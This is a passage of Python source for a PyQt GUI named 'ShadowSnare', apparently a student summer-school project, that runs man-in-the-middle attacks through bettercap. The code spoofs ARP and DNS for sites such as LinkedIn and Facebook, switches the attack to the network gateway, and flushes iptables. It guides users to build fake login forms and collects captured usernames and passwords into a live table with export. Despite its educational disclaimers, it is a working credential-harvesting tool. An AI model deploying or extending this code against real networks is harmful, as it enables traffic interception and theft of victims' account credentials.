        # Test domains to check
        test_domains = ['linkedin.com', 'facebook.com', 'google.com']
        
        for domain in test_domains:
            try:
                # Use nslookup to check DNS resolution
                result = subprocess.run(['nslookup', domain], capture_output=True, text=True, timeout=5)
                
                if self.local_ip in result.stdout:
                    self.status_update.emit(f"✅ DNS spoofing WORKING for {domain} -> {self.local_ip}")
                elif "8.8.8.8" in result.stdout or "1.1.1.1" in result.stdout:
                    self.status_update.emit(f"❌ DNS spoofing BYPASSED for {domain} - using external DNS")
                    self.status_update.emit("💡 Target may be using DoH/DoT or cached DNS")
                else:
                    self.status_update.emit(f"⚠️ DNS resolution unclear for {domain}")
                    
            except subprocess.TimeoutExpired:
                self.status_update.emit(f"⏱️ DNS lookup timeout for {domain} - may indicate blocking")
            except Exception as e:
                self.status_update.emit(f"❌ DNS verification error for {domain}: {str(e)}")
        
        # Check ARP spoofing status
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            if self.target_ip in result.stdout:
                self.status_update.emit(f"✅ ARP table shows target {self.target_ip}")
            else:
                self.status_update.emit(f"⚠️ Target {self.target_ip} not in ARP cache")
        except:
            pass
        
        # Check if external DNS is blocked
        try:
            result = subprocess.run(['ping', '-c', '1', '-W', '2', '8.8.8.8'], 
                                   capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                self.status_update.emit("⚠️ External DNS 8.8.8.8 still reachable")
            else:
                self.status_update.emit("✅ External DNS 8.8.8.8 blocked")
        except:
            self.status_update.emit("✅ External DNS appears blocked")
        
        self.status_update.emit("🏁 DNS verification completed")
    
    def stop_engine(self):
        self.running = False
        
        # Stop bettercap process properly 
        if self.bettercap_process:
            try:
                import signal
                # Kill the entire process group
                os.killpg(os.getpgid(self.bettercap_process.pid), signal.SIGTERM)
                self.bettercap_process.terminate()
                self.bettercap_process.wait(timeout=5)
                self.status_update.emit("✅ Bettercap stopped")
            except:
                try:
                    os.killpg(os.getpgid(self.bettercap_process.pid), signal.SIGKILL)
                    self.status_update.emit("✅ Bettercap force stopped")
                except:
                    self.status_update.emit("⚠️ Bettercap cleanup issue")
        
        # Basic cleanup - no complex iptables stuff
        try:
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], check=False)
            subprocess.run(['sudo', 'iptables', '-F'], check=False)
            self.status_update.emit("✅ Basic cleanup completed")
        except Exception as e:
            self.status_update.emit(f"⚠️ Cleanup warning: {str(e)}")
            
        if self.bettercap_process:
            try:
                self.bettercap_process.terminate()
                self.bettercap_process.wait(timeout=5)
                self.status_update.emit("MITM Engine stopped")
            except Exception:
                self.bettercap_process.kill()
                self.status_update.emit("MITM Engine forcefully stopped")
            finally:
                self.bettercap_process = None
    
    def setup_alternative_attack(self):
        """Setup alternative attack when ARP spoofing fails"""
        try:
            self.status_update.emit("🔄 Setting up alternative attack method...")
            
            # Try gateway attack instead
            gateway_result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                          capture_output=True, text=True)
            if gateway_result.returncode == 0:
                gateway_ip = gateway_result.stdout.split()[2]
                self.status_update.emit(f"🚪 Detected gateway: {gateway_ip}")
                self.status_update.emit(f"💡 Consider targeting gateway {gateway_ip} for network-wide attack")
                
                # Send command to bettercap to change target
                if self.bettercap_process and self.bettercap_process.poll() is None:
                    try:
                        # Change ARP spoof target to gateway
                        cmd = f"set arp.spoof.target {gateway_ip}\n"
                        self.bettercap_process.stdin.write(cmd)
                        self.bettercap_process.stdin.flush()
                        self.status_update.emit(f"🎯 Switched target to gateway: {gateway_ip}")
                    except:
                        pass
                        
        except Exception as e:
            self.status_update.emit(f"⚠️ Alternative attack setup failed: {str(e)}")

class CredentialsMonitor(QThread):
    """Monitor credentials.json file for new captures"""
    credentials_found = pyqtSignal(dict)
    
    def __init__(self):
        super().__init__()
        self.running = False
        self.json_file_path = '/var/www/html/credentials.json'
        self.txt_file_path = '/var/www/html/credentials.txt'
        self.last_count = 0
        
    def run(self):
        self.running = True
        while self.running:
            try:
                # Check JSON file first (preferred method)
                if os.path.exists(self.json_file_path):
                    try:
                        with open(self.json_file_path, 'r') as f:
                            data = json.load(f)
                            
                        current_count = len(data)
                        if current_count > self.last_count:
                            # Process new credentials
                            new_creds = data[self.last_count:]
                            for cred in new_creds:
                                self.credentials_found.emit(cred)
                            self.last_count = current_count
                    except json.JSONDecodeError:
                        pass  # File might be being written to
                
                # Fallback to text file monitoring
                elif os.path.exists(self.txt_file_path):
                    try:
                        with open(self.txt_file_path, 'r') as f:
                            lines = f.readlines()
                            
                        current_count = len(lines)
                        if current_count > self.last_count:
                            # Parse new lines
                            new_lines = lines[self.last_count:]
                            for line in new_lines:
                                if 'Username:' in line or 'Email:' in line:
                                    cred = self.parse_text_credential(line)
                                    if cred:
                                        self.credentials_found.emit(cred)
                            self.last_count = current_count
                    except:
                        pass
                
                time.sleep(3)  # Check every 3 seconds
            except Exception as e:
                time.sleep(5)
    
    def parse_text_credential(self, line):
        """Parse a credential line from text file"""
        try:
            # Expected format: [timestamp] IP: ip | Service: service | Username: user | Password: pass
            if '|' in line:
                parts = [part.strip() for part in line.split('|')]
                if len(parts) >= 4:
                    timestamp = parts[0].replace('[', '').replace(']', '').strip()
                    ip = parts[1].replace('IP:', '').strip()
                    service = parts[2].replace('Service:', '').strip()
                    username = parts[3].replace('Username:', '').strip()
                    password = parts[4].replace('Password:', '').strip() if len(parts) > 4 else 'unknown'
                    
                    return {
                        'timestamp': timestamp,
                        'ip': ip,
                        'service': service,
                        'username': username,
                        'password': password
                    }
        except:
            pass
        return None
    
    def stop_monitoring(self):
        self.running = False

class ShadowSnareGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ShadowSnare - Advanced MITM Attack Tool by Team PORT:443")
        self.setGeometry(100, 100, 1400, 900)
        self.setStyleSheet(self.get_dark_theme())
        
        # Initialize variables
        self.mitm_engine = None
        self.network_scanner = None
        self.credentials_monitor = None
        self.discovered_hosts = []
        self.attack_active = False
        self.start_time = None
        self.captured_credentials = []
        
        self.init_ui()
        self.load_settings()  # Load settings before loading interfaces
        self.load_interfaces()
        self.start_uptime_timer()
        self.start_credentials_monitoring()
        
        # Add initial log messages to show the system is working
        self.log_message("🚀 ShadowSnare v2.0 initialized successfully", "SUCCESS")
        self.log_message("🔧 System ready for MITM operations", "INFO")
        self.log_message("⚠️ Remember: Educational use only!", "WARNING")
        self.log_message("💡 Select network interface and scan for targets", "INFO")
    
    def start_credentials_monitoring(self):
        """Start monitoring for captured credentials"""
        self.credentials_monitor = CredentialsMonitor()
        self.credentials_monitor.credentials_found.connect(self.add_captured_credential)
        self.credentials_monitor.start()
    
    def add_captured_credential(self, cred):
        """Add captured credential to table"""
        row = self.credentials_table.rowCount()
        self.credentials_table.insertRow(row)
        
        self.credentials_table.setItem(row, 0, QTableWidgetItem(cred['service']))
        self.credentials_table.setItem(row, 1, QTableWidgetItem(cred['username']))
        self.credentials_table.setItem(row, 2, QTableWidgetItem(cred['password']))
        self.credentials_table.setItem(row, 3, QTableWidgetItem(cred['timestamp']))
        
        self.captured_credentials.append(cred)
        self.captured_creds_label.setText(str(len(self.captured_credentials)))
        
        self.log_message(f"🔑 Credentials captured: {cred['username']}", "SUCCESS")
        
    def get_dark_theme(self):
        return """
        QMainWindow {
            background-color: #1a1a1a;
            color: #ffffff;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        QDialog {
            background-color: #1a1a1a;
            color: #ffffff;
        }
        
        QMessageBox {
            background-color: #1a1a1a;
            color: #ffffff;
        }
        
        QInputDialog {
            background-color: #1a1a1a;
            color: #ffffff;
        }
        
        QTabWidget::pane {
            border: 1px solid #333333;
            background-color: #1a1a1a;
            border-radius: 8px;
        }
        
        QTabBar::tab {
            background-color: #2d2d2d;
            color: #ffffff;
            padding: 12px 20px;
            margin-right: 2px;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            font-weight: 500;
        }
        
        QTabBar::tab:selected {
            background-color: #00ff7f;
            color: #000000;
        }
        
        QTabBar::tab:hover {
            background-color: #404040;
        }
        
        QPushButton {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #00ff7f;
            border-radius: 6px;
            padding: 10px 16px;
            font-weight: 600;
        }
        
        QPushButton:hover {
            background-color: #00ff7f;
            color: #000000;
        }
        
        QPushButton:pressed {
            background-color: #00cc66;
        }
        
        QPushButton:disabled {
            background-color: #404040;
            border-color: #555555;
            color: #888888;
        }
        
        QLineEdit, QComboBox, QTextEdit, QSpinBox {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #404040;
            border-radius: 6px;
            padding: 8px;
        }
        
        QLineEdit:focus, QComboBox:focus, QTextEdit:focus {
            border-color: #00ff7f;
        }
        
        QLabel {
            color: #ffffff;
            font-size: 13px;
        }
        
        QGroupBox {
            color: #ffffff;
            border: 1px solid #404040;
            border-radius: 8px;
            margin-top: 12px;
            padding-top: 12px;
            font-weight: 600;
        }
        
        QGroupBox::title {
            subcontrol-origin: margin;
            left: 12px;
            padding: 0 8px 0 8px;
            color: #00ff7f;
        }
        
        QTreeWidget, QTableWidget {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #404040;
            border-radius: 6px;
            alternate-background-color: #333333;
        }
        
        QTreeWidget::item:selected, QTableWidget::item:selected {
            background-color: #00ff7f;
            color: #000000;
        }
        
        QHeaderView::section {
            background-color: #333333;
            color: #ffffff;
            border: 1px solid #404040;
            padding: 8px;
            font-weight: 600;
        }
        
        QCheckBox {
            color: #ffffff;
        }
        
        QCheckBox::indicator:checked {
            background-color: #00ff7f;
            border: 2px solid #00ff7f;
        }
        
        QStatusBar {
            background-color: #2d2d2d;
            color: #ffffff;
            border-top: 1px solid #404040;
        }
        """
    
    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Create main layout
        layout = QVBoxLayout()
        
        # Create tab widget with the exact tabs from workflow.txt
        tab_widget = QTabWidget()
        tab_widget.addTab(self.create_dashboard_tab(), "🔵 Dashboard")
        tab_widget.addTab(self.create_mitm_engine_tab(), "🛠️ MITM Engine")
        tab_widget.addTab(self.create_fake_pages_tab(), "🧪 Fake Pages")
        tab_widget.addTab(self.create_victims_tab(), "🧑‍💻 Victims")
        tab_widget.addTab(self.create_credentials_tab(), "🔐 Credentials")
        tab_widget.addTab(self.create_logs_tab(), "📜 Logs")
        tab_widget.addTab(self.create_settings_tab(), "⚙️ Settings")
        
        layout.addWidget(tab_widget)
        
        # Create status bar exactly as specified
        self.create_status_bar()
        
        central_widget.setLayout(layout)
    
    def create_dashboard_tab(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Status Panel
        status_group = QGroupBox("Status Panel")
        status_layout = QFormLayout()
        
        self.mitm_status_label = QLabel("Stopped")
        self.mitm_status_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
        status_layout.addRow("MITM Engine:", self.mitm_status_label)
        
        self.active_spoofs_label = QLabel("0")
        status_layout.addRow("Active Spoofs:", self.active_spoofs_label)
        
        self.captured_creds_label = QLabel("0")
        status_layout.addRow("Captured Credentials:", self.captured_creds_label)
        
        self.network_interface_label = QLabel("None")
        status_layout.addRow("Network Interface:", self.network_interface_label)
        
        self.victims_connected_label = QLabel("0")
        status_layout.addRow("Victims Connected:", self.victims_connected_label)
        
        status_group.setLayout(status_layout)
        
        # Control Buttons
        buttons_group = QGroupBox("Attack Controls")
        buttons_layout = QGridLayout()
        
        self.start_attack_btn = QPushButton("⚔️ Start Attack")
        self.start_attack_btn.clicked.connect(self.start_attack)
        buttons_layout.addWidget(self.start_attack_btn, 0, 0)
        
        self.stop_attack_btn = QPushButton("⏹️ Stop Attack")
        self.stop_attack_btn.clicked.connect(self.stop_attack)
        self.stop_attack_btn.setEnabled(False)
        buttons_layout.addWidget(self.stop_attack_btn, 0, 1)
        
        self.refresh_victims_btn = QPushButton("🔄 Refresh Victims")
        self.refresh_victims_btn.clicked.connect(self.refresh_victims)
        buttons_layout.addWidget(self.refresh_victims_btn, 1, 0)
        
        self.view_logs_btn = QPushButton("📋 View Logs")
        self.view_logs_btn.clicked.connect(self.view_logs)
        buttons_layout.addWidget(self.view_logs_btn, 1, 1)
        
        # Add DNS verification button
        self.verify_dns_btn = QPushButton("🔍 Verify DNS Spoofing")
        self.verify_dns_btn.clicked.connect(self.verify_dns_spoofing)
        self.verify_dns_btn.setEnabled(False)  # Enable only when attack is running
        buttons_layout.addWidget(self.verify_dns_btn, 2, 0)
        
        # Add test script button
        self.test_script_btn = QPushButton("🧪 Run Test Script")
        self.test_script_btn.clicked.connect(self.run_test_script)
        buttons_layout.addWidget(self.test_script_btn, 2, 1)
        
        buttons_group.setLayout(buttons_layout)
        
        layout.addWidget(status_group)
        layout.addWidget(buttons_group)
        layout.addStretch()
        
        widget.setLayout(layout)
        return widget
    
    def create_mitm_engine_tab(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Interface Selection
        interface_group = QGroupBox("Network Configuration")
        interface_layout = QFormLayout()
        
        self.interface_combo = QComboBox()
        self.interface_combo.currentTextChanged.connect(self.on_interface_changed)
        interface_layout.addRow("Select Network Interface:", self.interface_combo)
        
        self.ip_range_start = QLineEdit("192.168.1.1")
        interface_layout.addRow("IP Range Start:", self.ip_range_start)
        
        self.ip_range_end = QLineEdit("192.168.1.254")
        interface_layout.addRow("IP Range End:", self.ip_range_end)
        
        scan_btn = QPushButton("🔍 Scan Network")
        scan_btn.clicked.connect(self.scan_network)
        interface_layout.addRow("", scan_btn)
        
        interface_group.setLayout(interface_layout)
        
        # Spoofing Options
        spoofing_group = QGroupBox("Spoofing Options")
        spoofing_layout = QVBoxLayout()
        
        self.enable_arp_spoof = QCheckBox("Enable ARP Spoofing")
        self.enable_arp_spoof.setChecked(True)
        spoofing_layout.addWidget(self.enable_arp_spoof)
        
        self.enable_dns_spoof = QCheckBox("Enable DNS Spoofing")
        self.enable_dns_spoof.setChecked(True)
        spoofing_layout.addWidget(self.enable_dns_spoof)
        
        self.enable_ssl_strip = QCheckBox("SSL Strip")
        spoofing_layout.addWidget(self.enable_ssl_strip)
        
        self.redirect_http = QCheckBox("Redirect HTTP to Fake Login Page")
        self.redirect_http.setChecked(True)
        spoofing_layout.addWidget(self.redirect_http)
        
        self.custom_redirects = QCheckBox("Custom Host Redirects (ex: linkedin.com → 192.168.0.X)")
        spoofing_layout.addWidget(self.custom_redirects)
        
        spoofing_group.setLayout(spoofing_layout)
        
        # Attack Controls
        controls_group = QGroupBox("Attack Controls")
        controls_layout = QHBoxLayout()
        
        start_mitm_btn = QPushButton("🚀 Start MITM")
        start_mitm_btn.clicked.connect(self.start_mitm)
        controls_layout.addWidget(start_mitm_btn)
        
        stop_mitm_btn = QPushButton("⏹️ Stop MITM")
        stop_mitm_btn.clicked.connect(self.stop_mitm)
        controls_layout.addWidget(stop_mitm_btn)
        
        controls_group.setLayout(controls_layout)
        
        # Apache Server Controls
        apache_group = QGroupBox("Apache Server Controls")
        apache_layout = QHBoxLayout()
        
        start_apache_btn = QPushButton("🟢 Start Apache")
        start_apache_btn.clicked.connect(self.start_apache)
        apache_layout.addWidget(start_apache_btn)
        
        stop_apache_btn = QPushButton("🔴 Stop Apache")
        stop_apache_btn.clicked.connect(self.stop_apache)
        apache_layout.addWidget(stop_apache_btn)
        
        restart_apache_btn = QPushButton("🔄 Restart Apache")
        restart_apache_btn.clicked.connect(self.restart_apache)
        apache_layout.addWidget(restart_apache_btn)
        
        check_apache_btn = QPushButton("📊 Check Status")
        check_apache_btn.clicked.connect(self.check_apache_status)
        apache_layout.addWidget(check_apache_btn)
        
        apache_group.setLayout(apache_layout)
        
        # Website Monitoring Section
        monitoring_group = QGroupBox("🌐 Victim Website Activity")
        monitoring_layout = QVBoxLayout()
        
        # Website visits table
        self.website_table = QTableWidget(0, 3)
        self.website_table.setHorizontalHeaderLabels(["Time", "Victim IP", "Website Visited"])
        self.website_table.horizontalHeader().setStretchLastSection(True)
        self.website_table.setMaximumHeight(200)
        monitoring_layout.addWidget(self.website_table)
        
        # Clear visits button
        clear_visits_btn = QPushButton("🗑️ Clear Website History")
        clear_visits_btn.clicked.connect(self.clear_website_history)
        monitoring_layout.addWidget(clear_visits_btn)
        
        monitoring_group.setLayout(monitoring_layout)
        
        # Enhanced Attack Logs
        logs_group = QGroupBox("📡 Attack Logs")
        logs_layout = QVBoxLayout()
        
        # Log filter controls
        filter_layout = QHBoxLayout()
        filter_layout.addWidget(QLabel("Filter:"))
        
        self.log_filter = QComboBox()
        self.log_filter.addItems(["All Logs", "HTTP Traffic", "DNS Spoofing", "ARP Spoofing", "Credentials"])
        self.log_filter.currentTextChanged.connect(self.filter_logs)
        filter_layout.addWidget(self.log_filter)
        
        clear_logs_btn = QPushButton("🗑️ Clear Logs")
        clear_logs_btn.clicked.connect(self.clear_attack_logs)
        filter_layout.addWidget(clear_logs_btn)
        
        logs_layout.addLayout(filter_layout)
        
        # Enhanced log display
        self.attack_logs = QTextEdit()
        self.attack_logs.setMaximumHeight(250)
        self.attack_logs.setStyleSheet("""
            QTextEdit {
                background-color: #1a1a1a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                border: 1px solid #404040;
                border-radius: 6px;
                padding: 8px;
            }
        """)
        logs_layout.addWidget(self.attack_logs)
        
        logs_group.setLayout(logs_layout)
        
        layout.addWidget(interface_group)
        layout.addWidget(spoofing_group)
        layout.addWidget(controls_group)
        layout.addWidget(apache_group)
        layout.addWidget(monitoring_group)
        layout.addWidget(logs_group)
        layout.addStretch()
        
        widget.setLayout(layout)
        return widget
    
    def create_fake_pages_tab(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Educational Notice
        notice_group = QGroupBox("⚠️ Educational Notice - No Pre-built Templates")
        notice_layout = QVBoxLayout()
        
        notice_label = QLabel("""
<b>IMPORTANT:</b> ShadowSnare does NOT provide any pre-built phishing templates for ethical reasons.

<b>Educational Testing Requirements:</b>
1. <b>You MUST create your own test pages manually</b>
2. Place your HTML files in <b>/var/www/html/</b> directory
3. Design your own forms for educational testing purposes
4. Use the credential capture system provided below
5. <b>Only test on networks you own or have explicit permission to test</b>

<b>Why No Templates?</b>
• Prevents misuse for malicious purposes
• Encourages learning HTML/web development
• Ensures users understand what they're doing
• Maintains ethical standards in cybersecurity education
        """)
        notice_label.setWordWrap(True)
        notice_label.setStyleSheet("color: #ff6b6b; background-color: #2d1a1a; padding: 15px; border-radius: 8px; border: 2px solid #ff6b6b; font-weight: bold;")
        notice_layout.addWidget(notice_label)
        notice_group.setLayout(notice_layout)
        
        # Manual Page Management
        management_group = QGroupBox("📁 Manual Page Management")
        management_layout = QVBoxLayout()
        
        # Instructions
        instructions = QLabel("""
<b>Step-by-Step Guide for Creating Test Pages:</b>

<b>1. Create Your Own Test Page:</b>
   • Write your own HTML file (e.g., login.html, index.html)
   • Design your own login form for educational testing
   • <b>NO TEMPLATES PROVIDED - You must create everything yourself</b>
   • Save your file as /var/www/html/index.html (or any name)

<b>2. Credential Capture Setup:</b>
   • Forms should POST to 'credentials.php'
   • Use input fields named 'username' and 'password'
   • Add hidden field: &lt;input type="hidden" name="service" value="your-service-name"&gt;
   • The system will automatically capture submitted credentials

<b>3. Deploy and Test:</b>
   • Use Apache controls below to start the web server
   • Your page will be available at http://localhost/
   • Monitor captured credentials in the Credentials tab
   • <b>Only test on your own network or with explicit permission</b>

<b>Example Form Structure (you must code this yourself):</b>
   &lt;form action="credentials.php" method="POST"&gt;
     &lt;input type="text" name="username" placeholder="Username"&gt;
     &lt;input type="password" name="password" placeholder="Password"&gt;
     &lt;input type="hidden" name="service" value="test-service"&gt;
     &lt;button type="submit"&gt;Submit&lt;/button&gt;
   &lt;/form&gt;
        """)
        instructions.setWordWrap(True)
        instructions.setStyleSheet("color: #74c0fc; background-color: #1a1a2d; padding: 15px; border-radius: 8px;")
        management_layout.addWidget(instructions)
        
        # Control buttons
        controls_layout = QHBoxLayout()
        
        open_html_dir_btn = QPushButton("� Open HTML Directory")
        open_html_dir_btn.clicked.connect(self.open_html_directory)
        controls_layout.addWidget(open_html_dir_btn)
        
        deploy_capture_btn = QPushButton("🔧 Deploy Capture Script")
        deploy_capture_btn.clicked.connect(self.deploy_capture_script)
        controls_layout.addWidget(deploy_capture_btn)
        
        preview_btn = QPushButton("👁️ Preview Current Page")
        preview_btn.clicked.connect(self.preview_current_page)
        controls_layout.addWidget(preview_btn)
        
        management_layout.addLayout(controls_layout)
        management_group.setLayout(management_layout)
        
        # Capture System Status
        status_group = QGroupBox("📊 Capture System Status")
        status_layout = QVBoxLayout()
        
        self.capture_status_label = QLabel("❌ Capture system not deployed")
        self.capture_status_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
        status_layout.addWidget(self.capture_status_label)
        
        self.apache_status_label = QLabel("❌ Apache server stopped")
        self.apache_status_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
        status_layout.addWidget(self.apache_status_label)
        
        status_group.setLayout(status_layout)
        
        layout.addWidget(notice_group)
        layout.addWidget(management_group)
        layout.addWidget(status_group)
        layout.addStretch()
        
        widget.setLayout(layout)
        return widget
    
    def create_victims_tab(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Victims Table
        victims_group = QGroupBox("Discovered Victims")
        victims_layout = QVBoxLayout()
        
        self.victims_table = QTableWidget()
        self.victims_table.setColumnCount(4)
        self.victims_table.setHorizontalHeaderLabels(["IP Address", "MAC Address", "Hostname", "Status"])
        self.victims_table.horizontalHeader().setStretchLastSection(True)
        victims_layout.addWidget(self.victims_table)
        
        # Victim control buttons
        victim_controls = QHBoxLayout()
        
        block_btn = QPushButton("🚫 Block")
        block_btn.clicked.connect(self.block_victim)
        victim_controls.addWidget(block_btn)
        
        disconnect_btn = QPushButton("⚡ Disconnect")
        disconnect_btn.clicked.connect(self.disconnect_victim)
        victim_controls.addWidget(disconnect_btn)
        
        inspect_btn = QPushButton("🔍 Inspect Traffic")
        inspect_btn.clicked.connect(self.inspect_traffic)
        victim_controls.addWidget(inspect_btn)
        
        victims_layout.addLayout(victim_controls)
        victims_group.setLayout(victims_layout)
        
        layout.addWidget(victims_group)
        widget.setLayout(layout)
        return widget
    
    def create_credentials_tab(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Credentials Table
        creds_group = QGroupBox("Live Captured Credentials")
        creds_layout = QVBoxLayout()
        
        self.credentials_table = QTableWidget()
        self.credentials_table.setColumnCount(4)
        self.credentials_table.setHorizontalHeaderLabels(["Service", "Username", "Password", "Timestamp"])
        self.credentials_table.horizontalHeader().setStretchLastSection(True)
        creds_layout.addWidget(self.credentials_table)
        
        # Export controls
        export_controls = QHBoxLayout()
        
        export_txt_btn = QPushButton("📄 Export to .txt")
        export_txt_btn.clicked.connect(self.export_txt)
        export_controls.addWidget(export_txt_btn)
        
        export_csv_btn = QPushButton("📊 Export to .csv")
        export_csv_btn.clicked.connect(self.export_csv)
        export_controls.addWidget(export_csv_btn)
        
        clear_all_btn = QPushButton("🗑️ Clear All")
        clear_all_btn.clicked.connect(self.clear_credentials)
        export_controls.addWidget(clear_all_btn)
        
        creds_layout.addLayout(export_controls)
        creds_group.setLayout(creds_layout)
        
        layout.addWidget(creds_group)
        widget.setLayout(layout)
        return widget
    
    def create_logs_tab(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Log controls
        controls_group = QGroupBox("Log Controls")
        controls_layout = QHBoxLayout()
        
        self.show_only_errors = QCheckBox("Show only errors")
        controls_layout.addWidget(self.show_only_errors)
        
        self.auto_scroll = QCheckBox("Auto-scroll")
        self.auto_scroll.setChecked(True)
        controls_layout.addWidget(self.auto_scroll)
        
        save_logs_btn = QPushButton("💾 Save logs to file")
        save_logs_btn.clicked.connect(self.save_logs)
        controls_layout.addWidget(save_logs_btn)
        
        clear_logs_btn = QPushButton("🗑️ Clear Logs")
        clear_logs_btn.clicked.connect(self.clear_logs)
        controls_layout.addWidget(clear_logs_btn)
        
        controls_group.setLayout(controls_layout)
        
        # Log display
        logs_group = QGroupBox("Console Log Feed")
        logs_layout = QVBoxLayout()
        
        self.logs_display = QTextEdit()
        self.logs_display.setReadOnly(True)
        self.logs_display.setStyleSheet("""
            QTextEdit {
                background-color: #1a1a1a;
                color: #ffffff;
                border: 1px solid #404040;
                border-radius: 6px;
                font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
                font-size: 12px;
                padding: 8px;
                line-height: 1.4;
            }
            QScrollBar:vertical {
                background-color: #2d2d2d;
                width: 12px;
                border-radius: 6px;
            }
            QScrollBar::handle:vertical {
                background-color: #00ff7f;
                border-radius: 6px;
                min-height: 20px;
            }
            QScrollBar::handle:vertical:hover {
                background-color: #00cc66;
            }
        """)
        logs_layout.addWidget(self.logs_display)
        
        logs_group.setLayout(logs_layout)
        
        layout.addWidget(controls_group)
        layout.addWidget(logs_group)
        
        widget.setLayout(layout)
        return widget
    
    def create_settings_tab(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Team Information
        team_group = QGroupBox("🎓 Team Information")
        team_layout = QVBoxLayout()
        
        team_info = QLabel("""
<h3 style='color: #00ff7f; margin-bottom: 15px;'>Summer School 2025</h3>
<p style='color: #ffffff; line-height: 1.6;'>
<b>Project:</b> ShadowSnare - Advanced Ethical MITM Framework<br>
<b>Program:</b> Cybersecurity Summer School 2025<br>
<b>Objective:</b> Educational tool for understanding network security vulnerabilities<br>
</p>

<h4 style='color: #00ff7f; margin-top: 20px; margin-bottom: 10px;'>Team Members:</h4>
<p style='color: #ffffff; line-height: 1.8;'>
• <b>Dhruv Verma</b><br>
• <b>Saket Kesar</b><br>
• <b>Atharav Gaonker</b><br>
</p>

<p style='color: #ff6b6b; margin-top: 20px; font-weight: bold;'>
⚠️ This tool is for educational and authorized testing purposes only.
</p>
        """)
        team_info.setWordWrap(True)
        team_info.setAlignment(Qt.AlignTop)
        team_layout.addWidget(team_info)
        team_group.setLayout(team_layout)
        
        # Path Settings
        paths_group = QGroupBox("🔧 Tool Paths")
        paths_layout = QFormLayout()
        
        self.bettercap_path = QLineEdit("/usr/bin/bettercap")
        paths_layout.addRow("Path to Bettercap:", self.bettercap_path)
        
        self.default_interface = QLineEdit("wlan0")
        paths_layout.addRow("Default Interface:", self.default_interface)
        
        self.dns_rules_file = QLineEdit()
        browse_btn = QPushButton("📁 Browse")
        browse_btn.clicked.connect(self.browse_dns_rules)
        browse_layout = QHBoxLayout()
        browse_layout.addWidget(self.dns_rules_file)
        browse_layout.addWidget(browse_btn)
        paths_layout.addRow("Custom DNS Rules File:", browse_layout)
        
        # Add save settings button
        save_settings_btn = QPushButton("💾 Save Settings")
        save_settings_btn.clicked.connect(self.save_settings)
        paths_layout.addRow("", save_settings_btn)
        
        paths_group.setLayout(paths_layout)
        
        # Behavior Settings
        behavior_group = QGroupBox("⚙️ Application Behavior")
        behavior_layout = QVBoxLayout()
        
        self.auto_start_mitm = QCheckBox("Auto-start MITM on launch")
        behavior_layout.addWidget(self.auto_start_mitm)
        
        self.enable_notifications = QCheckBox("Enable Notifications")
        self.enable_notifications.setChecked(True)
        behavior_layout.addWidget(self.enable_notifications)
        
        self.log_to_file = QCheckBox("Save logs to file")
        self.log_to_file.setChecked(True)
        behavior_layout.addWidget(self.log_to_file)
        
        behavior_group.setLayout(behavior_layout)
        
        layout.addWidget(team_group)
        layout.addWidget(paths_group)
        layout.addWidget(behavior_group)
        layout.addStretch()
        
        widget.setLayout(layout)
        return widget
    
    def create_status_bar(self):
        # Create status bar exactly as specified in workflow.txt
        status_bar = self.statusBar()
        
        self.mitm_engine_status = QLabel("❌ MITM Engine Inactive")
        self.mitm_engine_status.setStyleSheet("color: #ff6b6b; font-weight: bold;")
        status_bar.addWidget(self.mitm_engine_status)
        
        status_bar.addPermanentWidget(QLabel("  |  "))
        
        self.network_status = QLabel("🔴 No Interface")
        status_bar.addPermanentWidget(self.network_status)
        
        status_bar.addPermanentWidget(QLabel("  |  "))
        
        self.uptime_label = QLabel("🕒 Uptime: 00:00:00")
        status_bar.addPermanentWidget(self.uptime_label)
    
    def load_interfaces(self):
        """Load network interfaces"""
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            if result.returncode == 0:
                interfaces = []
                for line in result.stdout.split('\n'):
                    if ': ' in line and 'state' in line:
                        interface = line.split(':')[1].strip().split('@')[0]
                        if interface not in ['lo'] and not interface.startswith('veth'):
                            interfaces.append(interface)
                
                self.interface_combo.clear()
                
                # Set wlan0 as default if available, otherwise use first interface
                default_interface = self.default_interface.text() if hasattr(self, 'default_interface') else "wlan0"
                if default_interface in interfaces:
                    interfaces.remove(default_interface)
                    interfaces.insert(0, default_interface)
                
                self.interface_combo.addItems(interfaces)
                
                if interfaces:
                    self.network_interface_label.setText(interfaces[0])
                    self.network_status.setText(f"🟡 {interfaces[0]}:Ready")
                    
        except Exception as e:
            self.log_message(f"Failed to load interfaces: {str(e)}", "ERROR")
    
    def on_interface_changed(self, interface_name):
        """Called when user changes network interface"""
        if interface_name:
            self.network_interface_label.setText(interface_name)
            self.network_status.setText(f"🟡 {interface_name}:Ready")
            self.log_message(f"📡 Network interface changed to: {interface_name}", "INFO")
            
            # Update test script to use selected interface
            if hasattr(self, 'test_bettercap_script'):
                self.update_test_script_interface(interface_name)
    
    def update_test_script_interface(self, interface_name):
        """Update the test script to use the selected interface"""
        try:
            with open('/home/saket/Documents/SummerSchool2025IITJammu/test_bettercap_script.sh', 'r') as f:
                content = f.read()
            
            # Update the interface in the test script
            updated_content = content.replace('192.168.1.3', 'TARGET_IP')
            updated_content = updated_content.replace('192.168.1.14', 'ATTACKER_IP')
